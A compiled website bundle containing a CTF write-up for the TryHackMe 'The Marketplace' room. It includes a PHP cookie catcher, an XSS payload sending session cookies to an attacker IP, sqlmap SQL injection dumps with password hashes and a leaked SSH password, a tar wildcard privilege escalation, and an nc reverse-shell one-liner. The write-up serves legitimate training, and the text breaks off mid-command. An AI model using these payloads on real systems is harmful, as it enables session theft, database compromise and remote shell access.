"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9170],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),p=c(n),h=r,m=p["".concat(l,".").concat(h)]||p[h]||d[h]||o;return n?a.createElement(m,i(i({ref:t},u),{},{components:n})):a.createElement(m,i({ref:t},u))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[p]="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},23484:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const o={},i="The Marketplace",s={unversionedId:"Tryhackme/The Marketplace/The Marketplace",id:"Tryhackme/The Marketplace/The Marketplace",title:"The Marketplace",description:"Can you take over The Marketplace's infrastructure?",source:"@site/writeups/Tryhackme/The Marketplace/The Marketplace.md",sourceDirName:"Tryhackme/The Marketplace",slug:"/Tryhackme/The Marketplace/",permalink:"/writeups/Tryhackme/The Marketplace/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"The Impossible Challenge",permalink:"/writeups/Tryhackme/The Impossible Challenge/"},next:{title:"The Server From Hell",permalink:"/writeups/Tryhackme/The Server From Hell/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 The Marketplace",id:"task-1-the-marketplace",level:2}],u={toc:c},p="wrapper";function d(e){let{components:t,...o}=e;return(0,r.kt)(p,(0,a.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"the-marketplace"},"The Marketplace"),(0,r.kt)("p",null,"Can you take over The Marketplace's infrastructure?"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/marketplace"},"The Marketplace")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Cookie Manipulation"),(0,r.kt)("li",{parentName:"ul"},"SQL Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Misconfigured Binaries"),(0,r.kt)("li",{parentName:"ul"},"Exploitation Docker")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-the-marketplace"},"Task 1 The Marketplace"),(0,r.kt)("p",null,"The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out."),(0,r.kt)("p",null,"Can you take advantage of this and will you be able to gain root access on his server?"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ sudo nmap -A -sS -sC -sV -O 10.10.225.14\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 13:04 CEST\nNmap scan report for 10.10.225.14\nHost is up (0.041s latency).\nNot shown: 997 filtered ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)\n|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)\n|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)\n80/tcp    open  http    nginx 1.19.2\n| http-robots.txt: 1 disallowed entry\n|_/admin\n|_http-server-header: nginx/1.19.2\n|_http-title: The Marketplace\n32768/tcp open  http    Node.js (Express middleware)\n| http-robots.txt: 1 disallowed entry\n|_/admin\n|_http-title: The Marketplace\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   40.97 ms 10.8.0.1\n2   41.19 ms 10.10.225.14\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.60 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ gobuster dir -u http://10.10.225.14 -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.225.14\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/24 13:08:05 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/admin (Status: 403)\n/Admin (Status: 403)\n/ADMIN (Status: 403)\n/images (Status: 301)\n/login (Status: 200)\n/Login (Status: 200)\n/messages (Status: 302)\n/new (Status: 302)\n/robots.txt (Status: 200)\n/signup (Status: 200)\n/stylesheets (Status: 301)\n===============================================================\n2020/10/24 13:08:26 Finished\n===============================================================\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n    header('Location: http://10.10.225.14/admin');\n\n    if (isset($_GET['c'])) {\n        $cookie = $_GET['c'];\n        $file = fopen('cookie.txt', 'a+');\n        fwrite($file, $cookie);\n    }\n?>\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<script type="text/javascript">\n  document.location =\n    "http://10.8.106.222/thief/index.php?c=" + document.cookie;\n<\/script>\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ service apache2 start\nkali@kali:~/CTFs/tryhackme/The Marketplace$ cd /var/www/html/\nkali@kali:/var/www/html$ sudo mkdir thief\nkali@kali:/var/www/html$ cd thief/\nkali@kali:/var/www/html/thief$ ls\nindex.php\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:/var/www/html/thief$ cat cookie.txt\ntoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1NDAyNTl9.uwhuYwdbVykf0R_jiUVO0ITbgzhKXU_KxeYkPL4mWx4\n")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(92209).Z,width:"959",height:"357"})),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(98503).Z,width:"812",height:"278"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt --technique=U --dbms=mysql --delay=3\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.9#stable}\n|_ -| . [\"]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 14:20:02 /2020-10-24/\n\n[14:20:02] [INFO] parsing HTTP request from 'r.txt'\nCookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]\n[14:20:05] [INFO] testing connection to the target URL\n[14:20:08] [INFO] checking if the target is protected by some kind of WAF/IPS\n[14:20:15] [INFO] heuristic (basic) test shows that GET parameter 'user' might be injectable (possible DBMS: 'MySQL')\n[14:20:18] [INFO] testing for SQL injection on GET parameter 'user'\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]\nit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]\n[14:20:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'\n[14:20:27] [WARNING] reflective value(s) found and filtering out\n[14:20:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[14:20:45] [INFO] target URL appears to have 4 columns in query\n[14:21:13] [INFO] GET parameter 'user' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable\n[14:21:13] [INFO] checking if the injection point on GET parameter 'user' is a false positive\nGET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\nsqlmap identified the following injection point(s) with a total of 23 HTTP(s) requests:\n---\nParameter: user (GET)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: user=-9682 UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x6f615855645746416c77565742566c6c6c5456656f447562594f786e556f53785071696e73674b7a,0x717a767071),NULL,NULL-- -\n---\n[14:21:43] [INFO] testing MySQL\n[14:21:46] [INFO] confirming MySQL\n[14:21:52] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 8.0.0\n[14:22:08] [WARNING] HTTP error codes detected during run:\n500 (Internal Server Error) - 9 times\n[14:22:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.225.14'\n\n[*] ending @ 14:22:08 /2020-10-24/\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt --current-db\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.4.9#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 14:22:54 /2020-10-24/\n\n[14:22:54] [INFO] parsing HTTP request from 'r.txt'\nCookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]\n[14:22:55] [INFO] resuming back-end DBMS 'mysql'\n[14:22:55] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: user (GET)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: user=-9682 UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x6f615855645746416c77565742566c6c6c5456656f447562594f786e556f53785071696e73674b7a,0x717a767071),NULL,NULL-- -\n---\n[14:22:56] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL 8\n[14:22:56] [INFO] fetching current database\ncurrent database: 'marketplace'\n[14:22:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.225.14'\n\n[*] ending @ 14:22:56 /2020-10-24/\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt -D marketplace --dump\n        ___\n       __H__\n ___ ___[(]_____ ___ ___  {1.4.9#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 14:23:48 /2020-10-24/\n\n[14:23:48] [INFO] parsing HTTP request from 'r.txt'\nCookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]\n[14:23:51] [INFO] resuming back-end DBMS 'mysql'\n[14:23:51] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: user (GET)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: user=-9682 UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x6f615855645746416c77565742566c6c6c5456656f447562594f786e556f53785071696e73674b7a,0x717a767071),NULL,NULL-- -\n---\n[14:23:51] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL 8\n[14:23:51] [INFO] fetching tables for database: 'marketplace'\n[14:23:52] [INFO] retrieved: 'items'\n[14:23:52] [INFO] retrieved: 'messages'\n[14:23:52] [INFO] retrieved: 'users'\n[14:23:52] [INFO] fetching columns for table 'items' in database 'marketplace'\n[14:23:52] [INFO] retrieved: 'author','int'\n[14:23:52] [INFO] retrieved: 'description','varchar(256)'\n[14:23:52] [INFO] retrieved: 'id','int'\n[14:23:52] [INFO] retrieved: 'image','varchar(64)'\n[14:23:52] [INFO] retrieved: 'title','text'\n[14:23:52] [INFO] fetching entries for table 'items' in database 'marketplace'\n[14:23:53] [INFO] retrieved: '2','Good as new. ','1','867a9d1a2edc2995dca4b13de50fc545','Dell Laptop'\n[14:23:53] [INFO] retrieved: '3','Yep, that's a cactus.','2','abffe546fb4cb740cc6b44f9e4c263df','A cactus'\n[14:23:53] [INFO] retrieved: '4','<script type=\"text/javascript\">document.location='http://10.8.106.222/cookie_thief.php?c='+document.cookie;<\/script>','3','598815c0f5554115631a3250e5...\n[14:23:53] [INFO] retrieved: '4','<script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>','4','598815c0f5554115631a3250e5db1719','t...\n[14:23:53] [INFO] retrieved: '4','<script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>','5','598815c0f5554115631a3250e5db1719','p...\n[14:23:53] [INFO] retrieved: '4','asd','6','598815c0f5554115631a3250e5db1719','asd'\n[14:23:53] [INFO] retrieved: '4','<script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>','7','598815c0f5554115631a3250e5db1719','asd'\n[14:23:53] [INFO] retrieved: '4','<script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>','8','598815c0f5554115631a3250e5db1719','c...\n[14:23:53] [INFO] recognized possible password hashes in column 'image'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N]\ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y\n[14:24:05] [INFO] using hash method 'md5_generic_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n> 1\n[14:24:15] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N]\n[14:24:19] [INFO] starting dictionary-based cracking (md5_generic_passwd)\n[14:24:19] [INFO] starting 2 processes\n[14:25:13] [WARNING] no clear password(s) found\nDatabase: marketplace\nTable: items\n[8 entries]\n+----+----------------------------------+----------------+--------+----------------------------------------------------------------------------------------------------------------------+\n| id | image                            | title          | author | description                                                                                                          |\n+----+----------------------------------+----------------+--------+----------------------------------------------------------------------------------------------------------------------+\n| 1  | 867a9d1a2edc2995dca4b13de50fc545 | Dell Laptop    | 2      | Good as new.                                                                                                         |\n| 2  | abffe546fb4cb740cc6b44f9e4c263df | A cactus       | 3      | Yep, that's a cactus.                                                                                                |\n| 3  | 598815c0f5554115631a3250e5db1719 | test           | 4      | <script type=\"text/javascript\">document.location='http://10.8.106.222/cookie_thief.php?c='+document.cookie;<\/script> |\n| 4  | 598815c0f5554115631a3250e5db1719 | test           | 4      | <script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>           |\n| 5  | 598815c0f5554115631a3250e5db1719 | pleas click me | 4      | <script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>           |\n| 6  | 598815c0f5554115631a3250e5db1719 | asd            | 4      | asd                                                                                                                  |\n| 7  | 598815c0f5554115631a3250e5db1719 | asd            | 4      | <script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>           |\n| 8  | 598815c0f5554115631a3250e5db1719 | click          | 4      | <script type=\"text/javascript\">document.location='http://10.8.106.222/thief/?c='+document.cookie;<\/script>           |\n+----+----------------------------------+----------------+--------+----------------------------------------------------------------------------------------------------------------------+\n\n[14:25:13] [INFO] table 'marketplace.items' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.225.14/dump/marketplace/items.csv'\n[14:25:13] [INFO] fetching columns for table 'users' in database 'marketplace'\n[14:25:13] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)\n[14:25:14] [INFO] retrieved: 'id','int'\n[14:25:14] [INFO] retrieved: 'isAdministrator','tinyint(1)'\n[14:25:14] [INFO] retrieved: 'password','varchar(128)'\n[14:25:14] [INFO] retrieved: 'username','varchar(32)'\n[14:25:14] [INFO] fetching entries for table 'users' in database 'marketplace'\n[14:25:14] [INFO] retrieved: '1','0','$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW','system'\n[14:25:14] [INFO] retrieved: '2','1','$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q','michael'\n[14:25:14] [INFO] retrieved: '3','1','$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG','jake'\n[14:25:14] [INFO] retrieved: '4','0','$2b$10$WuQs1eVOu4AOwaZjmxiLWOv.PLBAHP5AgwQzNfGVKQeAjWPcxtoyG','test'\nDatabase: marketplace\nTable: users\n[4 entries]\n+----+--------------------------------------------------------------+----------+-----------------+\n| id | password                                                     | username | isAdministrator |\n+----+--------------------------------------------------------------+----------+-----------------+\n| 1  | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | system   | 0               |\n| 2  | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | michael  | 1               |\n| 3  | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | jake     | 1               |\n| 4  | $2b$10$WuQs1eVOu4AOwaZjmxiLWOv.PLBAHP5AgwQzNfGVKQeAjWPcxtoyG | test     | 0               |\n+----+--------------------------------------------------------------+----------+-----------------+\n\n[14:25:14] [INFO] table 'marketplace.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.225.14/dump/marketplace/users.csv'\n[14:25:14] [INFO] fetching columns for table 'messages' in database 'marketplace'\n[14:25:14] [INFO] retrieved: 'id','int'\n[14:25:14] [INFO] retrieved: 'is_read','tinyint(1)'\n[14:25:14] [INFO] retrieved: 'message_content','varchar(1024)'\n[14:25:14] [INFO] retrieved: 'user_from','int'\n[14:25:14] [INFO] retrieved: 'user_to','int'\n[14:25:14] [INFO] fetching entries for table 'messages' in database 'marketplace'\n[14:25:15] [INFO] retrieved: '1','1','Hello!\\r\\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary passwor...\n[14:25:15] [INFO] retrieved: '2','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...\n[14:25:15] [INFO] retrieved: '3','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'\n[14:25:15] [INFO] retrieved: '4','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...\n[14:25:15] [INFO] retrieved: '5','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'\n[14:25:15] [INFO] retrieved: '6','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...\n[14:25:15] [INFO] retrieved: '7','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'\n[14:25:15] [INFO] retrieved: '8','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...\n[14:25:15] [INFO] retrieved: '9','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'\n[14:25:15] [INFO] retrieved: '10','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via p...\n[14:25:15] [INFO] retrieved: '11','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'\n[14:25:15] [INFO] retrieved: '12','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via p...\n[14:25:15] [INFO] retrieved: '13','0','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'\nDatabase: marketplace\nTable: messages\n[13 entries]\n+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| id | is_read | user_to | user_from | message_content                                                                                                                                                                                   |\n+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| 1  | 1       | 3       | 1         | Hello!\\r\\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\\r\\nYour new password is: @b_ENXkGYUCAv3zJ     |\n| 2  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |\n| 3  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |\n| 4  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |\n| 5  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |\n| 6  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |\n| 7  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |\n| 8  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |\n| 9  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |\n| 10 | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |\n| 11 | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |\n| 12 | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |\n| 13 | 0       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |\n+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\n\n[14:25:16] [INFO] table 'marketplace.messages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.225.14/dump/marketplace/messages.csv'\n[14:25:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.225.14'\n\n[*] ending @ 14:25:16 /2020-10-24/\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"@b_ENXkGYUCAv3zJ")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ ssh jake@10.10.225.14\nThe authenticity of host '10.10.225.14 (10.10.225.14)' can't be established.\nECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.225.14' (ECDSA) to the list of known hosts.\njake@10.10.225.14's password:\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Oct 24 12:27:45 UTC 2020\n\n  System load:  0.09               Users logged in:                0\n  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.225.14\n  Memory usage: 29%                IP address for docker0:         172.17.0.1\n  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1\n  Processes:    96\n\n  => / is using 87.1% of 14.70GB\n\n\n20 packages can be updated.\n0 updates are security updates.\n\n\njake@the-marketplace:~$ ls\nuser.txt\njake@the-marketplace:~$ cat user.txt\nTHM{c3648ee7af1369676e3e4b15da6dc0b4}\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'jake@the-marketplace:~$ sudo -l\nMatching Defaults entries for jake on the-marketplace:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jake may run the following commands on the-marketplace:\n    (michael) NOPASSWD: /opt/backups/backup.sh\njake@the-marketplace:~$ cat /opt/backups/backup.sh\n#!/bin/bash\necho "Backing up files...";\ntar cf /opt/backups/backup.tar *\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'jake@the-marketplace:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f" > shell.sh\njake@the-marketplace:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"\njake@the-marketplace:~$ echo "" > --checkpoint=1\njake@the-marketplace:~$ rm /opt/backups/backup.tar\njake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh\nBacking up files...\ntar: user.txt: Cannot open: Permission denied\nrm: cannot remove \'/tmp/f\': No such file or directory\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ nc -lnvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.225.14 40874\n$ whoami\nmichael\n$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > authorized_keys\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Marketplace$ ssh -i ~/.ssh/id_rsa michael@10.10.225.14\nWelcome to 